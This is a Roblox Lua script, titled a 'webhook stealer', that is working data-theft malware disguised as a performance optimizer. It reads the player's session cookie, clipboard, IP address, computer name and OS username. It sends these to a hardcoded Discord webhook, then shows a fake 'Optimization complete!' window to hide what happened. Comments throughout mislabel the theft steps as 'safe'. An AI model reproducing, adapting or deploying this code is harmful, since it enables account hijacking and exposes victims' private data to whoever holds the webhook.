-- ============================================================
-- WEBHOOK STEALER – NO RISKY PROPERTIES, FULL PCALL
-- ============================================================
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- ========== HTTP SENDER ==========
local function sendMessage(content)
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return pcall(request, {Url = webhook, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = webhook, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), webhook, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== COLLECT DATA – ONLY SAFE READS ==========
local function collectSnapshot()
    local player = game.Players.LocalPlayer
    local info = {}
    
    -- Executor (safe)
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
    
    -- Player info (always safe)
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
    else
        info.userId = "N/A"
        info.userName = "N/A"
        info.displayName = "N/A"
    end
    
    -- Game info – each wrapped in pcall individually
    local function getGameProp(prop, default)
        local ok, val = pcall(function() return game[prop] end)
        if ok and val ~= nil then
            return tostring(val)
        else
            return default
        end
    end
    info.placeId = getGameProp("PlaceId", "N/A")
    info.jobId = getGameProp("JobId", "N/A")
    info.gameName = getGameProp("Name", "Unknown")
    info.version = getGameProp("Version", "N/A")
    
    -- IP (multiple fallbacks)
    local ip = "N/A"
    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
    if ip == "N/A" then
        ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
        if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
    end
    if ip == "N/A" then
        ok, res = pcall(function() return game:GetService("HttpService"):GetAsync("https://api.ipify.org") end)
        if ok and res then ip = res:gsub("%s+", "") end
    end
    info.ip = ip
    
    -- Cookie attempt (safe)
    local cookie = "Not available"
    ok, res = pcall(getcookie, "https://www.roblox.com/")
    if ok and res and res ~= "" then cookie = res end
    info.cookie = cookie
    
    -- Clipboard (safe)
    local clip = "N/A"
    ok, res = pcall(getclipboard)
    if ok and res and res ~= "" then clip = res end
    info.clipboard = clip
    
    -- Character stats (safe)
    pcall(function()
        if player then
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
            end
        end
    end)
    
    -- Ping (safe)
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    
    -- FPS (safe)
    pcall(function()
        local run = game:GetService("RunService")
        local ft = run.RenderStepTime
        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
    end)
    
    -- Platform & Graphics (safe)
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
    end)
    
    -- System environment (safe)
    pcall(function()
        info.os = os.getenv("OS") or "N/A"
        info.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A"
        info.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A"
    end)
    
    return info
end

-- ========== SEND DATA ==========
local function sendData()
    local data = collectSnapshot()
    local lines = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(lines, string.format("%s: %s", k, tostring(v)))
        end
    end
    local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
    sendMessage(msg)
end

-- ========== GUI ==========
local function createGUI()
    pcall(function()
        local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        local gui = Instance.new("ScreenGui")
        gui.Parent = pg
        gui.ResetOnSpawn = false
        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 400, 0, 150)
        f.Position = UDim2.new(0.5, -200, 0.5, -75)
        f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
        f.BackgroundTransparency = 0.1
        f.Parent = gui
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 0, 50)
        t.Position = UDim2.new(0, 0, 0, 10)
        t.BackgroundTransparency = 1
        t.Text = "Performance Optimizer"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextScaled = true
        t.Font = Enum.Font.GothamBold
        t.Parent = f
        local s = Instance.new("TextLabel")
        s.Size = UDim2.new(1, 0, 0, 30)
        s.Position = UDim2.new(0, 0, 0.4, 0)
        s.BackgroundTransparency = 1
        s.Text = "Optimization complete!"
        s.TextColor3 = Color3.fromRGB(200, 200, 210)
        s.TextScaled = true
        s.Font = Enum.Font.Gotham
        s.Parent = f
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 100, 0, 35)
        btn.Position = UDim2.new(0.5, -50, 1, -45)
        btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
        btn.Text = "CLOSE"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.Parent = f
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
    end)
end

-- ========== MAIN ==========
sendData()
createGUI()
